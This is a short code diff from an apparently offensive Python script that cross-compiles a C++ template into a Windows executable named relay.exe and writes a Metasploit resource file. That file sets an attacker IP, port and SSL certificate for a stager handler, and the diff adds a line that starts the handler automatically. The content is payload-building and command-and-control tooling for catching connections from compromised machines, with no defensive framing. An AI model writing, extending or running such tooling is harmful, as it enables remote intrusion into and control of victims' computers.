@@ -134,7 +134,7 @@ with open('template.cpp', 'w') as file:
     file.write(cpp_template)
 
 # Compile the C++ code using the specified command
-compile_command = ['x86_64-w64-mingw32-g++', '--static', '-o', 'template.exe', 'template.cpp', '-fpermissive', '-lws2_32']
+compile_command = ['x86_64-w64-mingw32-g++', '--static', '-o', 'relay.exe', 'template.cpp', '-fpermissive', '-lws2_32']
 try:
     subprocess.check_output(compile_command, stderr=subprocess.STDOUT)
     print("Compilation completed successfully.")
@@ -175,6 +175,7 @@ set LHOST {attacker_ip}
 set LPORT {attacker_port}
 set StagerVerifySSLCert true
 set HandlerSSLCert {certificate_file}
+run
 '''
 
 msfconfig_filename = 'msfconfig.rc'
